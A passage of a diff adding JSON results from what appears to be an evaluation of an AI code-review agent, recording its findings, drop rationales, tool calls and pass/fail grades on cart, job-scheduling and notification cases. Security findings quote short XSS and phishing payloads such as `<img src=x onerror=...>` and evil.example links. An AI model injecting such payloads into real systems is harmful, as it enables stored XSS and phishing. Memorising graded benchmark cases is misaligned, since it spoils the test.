+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "R16-fixed-then-reintroduced",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 35547,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/cart/total.ts",
+          "claim": "WHAT: The new loop multiplies by `item.qty` directly, but `qty` is optional on Item (`qty?: number`), so an item without qty yields `price * undefined` = NaN and the whole returned total becomes NaN. WHY: The previous implementation defaulted with `item.qty ?? 1`; removing that fallback means any caller that builds an Item without qty silently gets NaN instead of a valid total. HOW: Restore the default: `sum += item.price * (item.qty ?? 1);`",
+          "keep": false,
+          "rationale": "The claim is technically correct (qty is optional in src/cart/types.ts, and line 5 multiplies item.price * item.qty with no fallback, producing NaN). However, this is the exact same problem already raised on this PR by the PreviousReviewDecision \"round-a-default-qty\": same file/location (src/cart/total.ts:4-5), same failure (item without qty makes the whole total NaN), and the same proposed fix (`item.qty ?? 1`). It is a duplicate of an already-posted suggestion, so it must be dropped per the repeat rule.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/cart/total.ts",
+                "startLine": 1,
+                "endLine": 20
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "qty\\??:",
+                "glob": "*.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 16,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 0
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "qty-default-reintroduced-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "R16-fixed-then-reintroduced",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 41375,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/cart/total.ts",
+          "claim": "WHAT: line 5 multiplies by `item.qty`, but `qty` is optional in `Item` (types.ts:1), so an item without `qty` produces `item.price * undefined` = NaN and `sum +=` propagates NaN through the rest of the accumulation. WHY: any cart containing an item with no `qty` makes `total` return NaN instead of a number — a regression versus the prior `(item.qty ?? 1)` default that this diff removed. HOW: restore the default: `sum += item.price * (item.qty ?? 1);`.",
+          "keep": false,
+          "rationale": "This is a repeat of PreviousReviewDecision 'round-a-default-qty' (src/cart/total.ts:4-4), which raised the exact same failure: `item.qty` being optional in Item (types.ts:1, `qty?: number`) causes NaN total when qty is absent, and proposed the identical fix `item.qty ?? 1`. Its Outcome is 'implemented', and the current diff shows the default was reverted (line 5 now `item.price * item.qty`). Per the rules, a finding whose consequence is the same wrong result in the same operation is that entry again — even when it describes the developer's fix being incomplete/reverted. The failure (NaN total from missing qty) and the location are identical to the already-posted suggestion.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/cart/total.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "types.ts",
+                "path": "src"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "types.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "interface Item|type Item|qty",
+                "glob": "*.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 16,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 0
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "qty-default-reintroduced-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "R16-fixed-then-reintroduced",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 38603,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/cart/total.ts",
+          "claim": "WHAT: the rewritten loop computes `item.price * item.qty` without the `?? 1` default that the previous implementation had, while `qty` is optional in `Item`. WHY: an item with no qty yields `price * undefined === NaN`, and `sum += NaN` poisons the accumulator, so `total()` returns NaN for the whole cart instead of a number. HOW: restore the default — `for (const item of items) sum += item.price * (item.qty ?? 1);`.",
+          "keep": false,
+          "rationale": "The claim is technically true (qty?: number, NaN propagation), but it is a verbatim repeat of PreviousDecision index 1 (round-a-default-qty): same file src/cart/total.ts, same line, same root cause (optional qty without default → NaN total), same proposed fix (item.qty ?? 1). That entry's outcome is \"implemented\". Per the repeat rule, a finding that raises again the problem an existing PR review entry already raised — including one arguing the fix is missing/incomplete — must be dropped.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/cart/total.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "qty",
+                "glob": "*.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/cart/types.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 11,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 0
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "qty-default-reintroduced-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "R16-fixed-then-reintroduced",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 29355,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/cart/total.ts",
+          "claim": "WHAT: the rewritten loop multiplies by `item.qty` with no default, while `Item.qty` is optional (`qty?: number` in src/cart/types.ts), so an item lacking qty yields `item.price * undefined` = NaN. WHY: NaN propagates through `sum`, so a single item without a quantity makes total() return NaN for the entire cart instead of a number. HOW: restore the default: `for (const item of items) sum += item.price * (item.qty ?? 1);`.",
+          "keep": false,
+          "rationale": "The candidate finding describes the identical failure already raised by PreviousDecision round-a-default-qty (src/cart/total.ts:4-4): `total` multiplies by optional `item.qty`, producing NaN for items lacking a quantity, and proposes the same fix (`item.qty ?? 1`). This is a repeat of the same bug in the same operation, which the rules require dropping regardless of the entry's outcome. The code confirms the same failure (qty is optional in types.ts, no default at line 5), so there is no new, distinct problem here — it is the exact issue already on the PR.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/cart/total.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/cart/types.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 10,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 0
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "qty-default-reintroduced-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P28-retry-cap-next-run-now",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 58035,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "internal/jobs/schedule.go",
+          "claim": "WHAT: The doc comment added on these lines states that once a job has failed MaxAttempts times it 'waits an hour before its next run', but the function actually returns `now` in that branch (zero delay). WHY: The documented contract is false — any caller/reviewer relying on the comment will assume a one-hour backoff exists when the job is in fact rescheduled with no delay. HOW: Either implement the stated behavior (`if job.Attempts >= MaxAttempts { return now.Add(time.Hour) }`) or correct the comment to match the code. Note this is separate from the already-reported issue that returning `now` lets the job be picked up on the next tick; the defect here is that the newly added comment documents behavior the code does not implement.",
+          "keep": false,
+          "rationale": "The finding is factually accurate (the comment says an hour, the code returns `now`), but its sole distinct content is a documentation/comment-vs-code mismatch. The actual runtime failure — returning `now` at MaxAttempts lets the job be re-picked on the next tick so the retry cap never stops it — is exactly the problem already raised by PreviousDecision index 8 (round-a-P28-retry-cap-next-run-now), which the finding itself concedes. Per the rules, a pure documentation defect with no separate wrong runtime outcome is not a reportable behavior bug, and the underlying behavior failure is a repeat of an existing entry on this PR.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "internal/jobs/schedule.go",
+                "startLine": 1,
+                "endLine": 45
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 12,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 0
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "cap-returns-now-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P28-retry-cap-next-run-now",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 31634,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 11,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "cap-returns-now-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P28-retry-cap-next-run-now",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 59762,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "internal/jobs/schedule.go",
+          "claim": "WHAT: The new doc comment (lines 21-23) states that once a job has failed MaxAttempts times it 'waits an hour before its next run, so a job that keeps failing stops running on every tick', but the code at line 25-27 returns `now` in that branch. WHY: the comment documents behavior the function does not implement — a maintainer reading it will believe the retry cap is enforced and won't fix the branch, while a permanently failing job is actually re-scheduled at `now` and re-run on every 5-second tick (Store.Due returns jobs whose NextRunAt is not after now, dispatch.go:9-10). HOW: either make the branch match the comment (e.g. `return now.Add(time.Hour)`) or correct the comment to describe the actual behavior.",
+          "keep": false,
+          "rationale": "This finding raises the exact same problem already posted on this PR as PreviousDecision round-a-P28-retry-cap-next-run-now (internal/jobs/schedule.go:18-20): the branch that fires at MaxAttempts returns `now`, so Store.Due re-selects the job on every 5-second tick and the retry cap never stops a permanently failing job. The candidate reframes the failure as a 'doc comment vs code mismatch', but the failure it describes — a job that keeps failing re-run on every tick because the cap branch returns `now` — is precisely the consequence the earlier entry already reported. Under the repeat rule, a finding whose consequence is the failure an existing entry described is that entry again, however reworded or whatever new cause/fix it names, regardless of that entry's Outcome. Drop.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "internal/jobs/schedule.go",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "func .*Due",
+                "path": "internal/jobs"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "func .*Due|NextRunAt",
+                "path": "internal/jobs"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "internal/jobs/dispatch.go",
+                "startLine": 1,
+                "endLine": 45
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "internal/jobs/schedule.go",
+          "claim": "WHAT: The new doc comment (lines 21-23) claims that once a job has failed MaxAttempts times it \"waits an hour before its next run\", but the code returns `now` unchanged in that branch, so no hour-long wait exists. WHY: The comment documents behavior that is not implemented, and combined with the existing dispatcher flow (dispatch.go:29 sets NextRunAt = now, and Store.Due returns every job whose NextRunAt is not after now) a permanently failing job is picked up again on the very next 5s tick — the comment makes this real defect look intentional and fixed. HOW: Either implement the documented wait in the capped branch (e.g. `return now.Add(time.Hour)`) or correct the comment to state the actual behavior; do not leave a comment asserting a wait the code never performs.",
+          "keep": false,
+          "rationale": "The finding's own core is a documentation mismatch: the comment claims an hour wait while the capped branch returns `now`. The actual behavioral defect it points to (job at MaxAttempts keeps being picked up every tick because NextRunAt=now and Due returns jobs not after now) is exactly the problem already raised in PreviousReviewDecisions entry round-a-P28-retry-cap-next-run-now at the same location, so re-raising it is a repeat. The remaining distinct claim — that the comment is wrong — is a documentation/comment correctness issue with no independent behavior consequence, which the drop rules exclude.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "internal/jobs/schedule.go",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "NextRunAt|func.*Due",
+                "glob": "internal/jobs/*.go"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "internal/jobs/dispatch.go",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 19,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 0
+      },
+      "delivered": [],
+      "claims": [
+        {
+          "id": "cap-returns-now-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P28-retry-cap-next-run-now",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 26905,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 8,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "cap-returns-now-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P28-retry-cap-next-run-now",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 36032,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 14,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": null,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "cap-returns-now-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 75367,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox builds the inbox `html` from m.authorName and m.body without stripInlineMarkup, while clients.ts:11 documents that this html is rendered as-is. WHY: a comment body containing `<img src=x onerror=...>` or `<a href=\"https://evil.example\">Reset password</a>` is stored and rendered raw in the web app inbox, giving stored XSS/phishing from user-controlled comment text. HOW: wrap both values, e.g. `html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}``.",
+          "keep": true,
+          "rationale": "Confirmed: mentionInbox at line 28 builds the inbox `html` directly from m.authorName and m.body with no stripInlineMarkup, while the sibling mentionEmail was fixed to strip both values and sanitize.ts states every outbound sink must pass user text through stripInlineMarkup. clients.ts:11 documents the inbox html is rendered as-is, so user-controlled comment text containing tags/links yields stored XSS/phishing. This is a distinct sink (inbox, not email) from the prior decision, so it is not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup",
+                "path": "src/notifications"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "endLine": 20,
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "endLine": 20,
+                "path": "src/notifications/clients.ts",
+                "startLine": 1
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates m.authorName and m.body into the chat message text without stripInlineMarkup, unlike the sibling mentionEmail which sanitizes both. WHY: chat `text` uses chat markup (clients.ts:6 — `<url|label>` renders a link, `<!channel>` pings everyone), so a comment body containing `<https://evil.example|Reset password>` or `<!channel>` renders as a live phishing link / channel-wide ping posted by our app. HOW: wrap both fields with stripInlineMarkup, e.g. text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>`.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat (mentions.ts:20-24) interpolates m.authorName and m.body directly into chat text, while sibling mentionEmail strips both via stripInlineMarkup. clients.ts:6 documents that chat text renders <url|label> as links and <!channel> as channel pings, and sanitize.ts explicitly lists these as the exact injection vectors. Unsanitized user input therefore renders as a live phishing link / channel-wide ping from our app. The previous decision at mentions.ts:15-16 covered only the email sink (subject/html); the chat sink is a distinct outbound operation, so this is not a repeat. Claim is technically accurate.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates m.authorName and m.body into the chat message without stripInlineMarkup, unlike the sibling mentionEmail. WHY: per clients.ts:6 chat `text` parses `<url|label>` as a link and `<!channel>` as a mass ping, so a comment body like `<!channel> <https://evil.example|Reset password>` pings the whole channel and renders a live phishing link sent from our bot. HOW: wrap both values, e.g. `text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>``.",
+          "keep": true,
+          "rationale": "Confirmed by direct code reading. mentionChat (mentions.ts:20-24) interpolates m.authorName and m.body into chat `text` with no stripInlineMarkup, unlike mentionEmail which does. clients.ts:6 documents that chat text interprets `<url|label>` as a live link and `<!channel>` as a mass ping, and sanitize.ts's own comment names exactly the `<https://evil.example|Reset password>` payload. User-controlled comment bodies/names therefore reach chat markup unsanitized — a real security path. This is a DIFFERENT sink (chat) than PreviousDecision index 1, which covered the email sink; it is the same kind of problem in a separate operation, not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox builds the inbox item's `html` from m.authorName and m.body without stripInlineMarkup, while clients.ts:11 documents that `html` is rendered as-is in the web app's notification inbox. WHY: raw user-supplied HTML (e.g. `<a href=\"https://evil.example\">Reset password</a>` or a `<script>`/`<img onerror=...>` payload) is injected into the inbox and executed/rendered in the victim's browser, enabling stored XSS or a phishing link. HOW: pass both fields through stripInlineMarkup, e.g. html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}`.",
+          "keep": true,
+          "rationale": "Confirmed by direct code evidence. clients.ts:11 documents that the InboxStore `html` field \"is rendered as is in the web app's notification inbox,\" and mentionInbox (mentions.ts:28) interpolates m.authorName and m.body raw, without stripInlineMarkup — unlike mentionEmail (line 16), which was fixed to strip both fields. So raw user-supplied HTML/script payloads from a comment are injected into the inbox and rendered in the victim's browser, a real stored-XSS/phishing path. The prior decision (round-a-P37-markup-strip-new-sinks) addressed mentionEmail — a different function and different sink (email); the same class of bug in a separate operation (inbox) is a distinct problem, not a repeat, so the drop rule does not apply. The claimed root cause and failure path are both accurate; nothing refutes the finding.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 30
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "mentionInbox|mentionEmail|mentionChat",
+                "excludeTests": true
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 22,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 4,
+        "after": 4
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `mentionChat` interpolates `m.authorName` and `m.body` without `stripInlineMarkup` while `mentionEmail` sanitizes both, a body like `<!channel> <https://evil.example|Reset password>` is parsed per `clients.ts:6` as a channel-wide ping and a live phishing link sent from our bot. Wrap both values with `stripInlineMarkup` before posting the chat `text`."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Since `mentionInbox` builds `html` from `m.authorName` and `m.body` without `stripInlineMarkup`, and `clients.ts:11` documents that this `html` is rendered as-is, a body containing `<img src=x onerror=...>` or a phishing anchor is stored and rendered raw in the web app inbox, enabling stored XSS/phishing from user-controlled comment text. Wrap both values with `stripInlineMarkup` before calling `inbox.add`."
+        },
+        {
+          "sourceIndex": 2,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `mentionChat` interpolates `m.authorName` and `m.body` without `stripInlineMarkup`, unlike the sanitizing `mentionEmail`, chat markup documented at `clients.ts:6` makes `<https://evil.example|Reset password>` render as a live phishing link and `<!channel>` ping everyone from our app. Wrap both fields with `stripInlineMarkup` before building the chat `text`."
+        },
+        {
+          "sourceIndex": 3,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `mentionInbox` builds the inbox item's `html` from `m.authorName` and `m.body` without `stripInlineMarkup`, and `clients.ts:11` documents that `html` is rendered as-is, raw user-supplied HTML such as `<a href=\"https://evil.example\">Reset password</a>` or a `<script>`/`<img onerror=...>` payload is injected into the victim's browser, enabling stored XSS or a phishing link. Pass both fields through `stripInlineMarkup` before calling `inbox.add`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "high",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 75956,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates m.authorName and m.body raw into InboxStore.add's html. WHY: clients.ts documents that html is 'rendered as is in the web app's notification inbox', so a comment containing '<img src=x onerror=...>' or '<script>' executes as stored XSS in the recipient's authenticated session. HOW: pass both fields through stripInlineMarkup before building the html string.",
+          "keep": true,
+          "rationale": "Confirmed. src/notifications/clients.ts:11 documents that inbox `html` is \"rendered as is in the web app's notification inbox\", and mentions.ts:28 interpolates raw m.authorName and m.body into that html with no stripInlineMarkup. This is a real stored-XSS sink. The prior review decision fixed the EMAIL sink (mentionEmail, lines 12-18) with stripInlineMarkup; the inbox sink is a separate operation and remains unsanitized, so this is a different problem, not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "html",
+                "path": "src/notifications"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 20
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates m.authorName and m.body directly into ChatClient.post's chat-markup text without stripping markup. WHY: chat text is rendered as markup (<url|label> becomes a live link, <!channel> pings everyone), so a comment body of '<https://evil.example|Reset password>' becomes a phishing link sent from our bot and '<!channel>' mass-pings the channel. HOW: wrap both fields in stripInlineMarkup, as mentionEmail already does.",
+          "keep": true,
+          "rationale": "Confirmed. mentionChat at lines 20-24 interpolates m.authorName and m.body raw into ChatClient.post's text, while the sibling mentionEmail (line 15-16) wraps both in stripInlineMarkup. The sanitize module's own doc comment explicitly names chat markup ('<!channel>' mentions and '<https://evil.example|Reset password>' links) as exactly what stripInlineMarkup is meant to remove, and states 'Every outbound sink passes user text through stripInlineMarkup first.' mentionChat is an outbound sink that does not, so a comment body can inject live links or mass-pings. This is a distinct sink/operation from PreviousDecision index 1 (which covered mentionEmail, already implemented), so it is not a repeat. The claim's root cause and failure path are factually correct and unrefuted.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
